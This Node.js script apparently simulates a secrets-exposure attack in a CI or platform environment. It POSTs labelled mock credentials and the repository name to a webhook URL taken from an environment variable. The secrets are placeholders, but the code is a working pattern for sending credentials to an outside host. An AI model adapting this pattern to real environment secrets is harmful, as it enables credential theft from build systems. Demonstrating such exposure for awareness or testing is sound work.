const https = require("https");

const mockSecrets = {
  AWS_KEY: "AWS_KEY_12345_2026",
  DB_PASS: "DATABASE_PASSWORD_2026",
  API_TOKEN: "API_TOKEN_98765_2026"
};

const endpoint = process.env.DEMO_WEBHOOK_URL;

if (!endpoint) {
  console.log("No demo endpoint configured.");
  process.exit(0);
}

const payload = JSON.stringify({
  simulation: "PaaS secrets exposure",
  repository: process.env.GITHUB_REPOSITORY || "demo",
  credentials: mockSecrets
});

const url = new URL(endpoint);

const request = https.request(
  url,
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  },
  (response) => {
    console.log(`Demo receiver status: ${response.statusCode}`);
    response.resume();
  }
);

request.on("error", (error) => {
  console.error("Demo request failed:", error.message);
});

request.write(payload);
request.end();
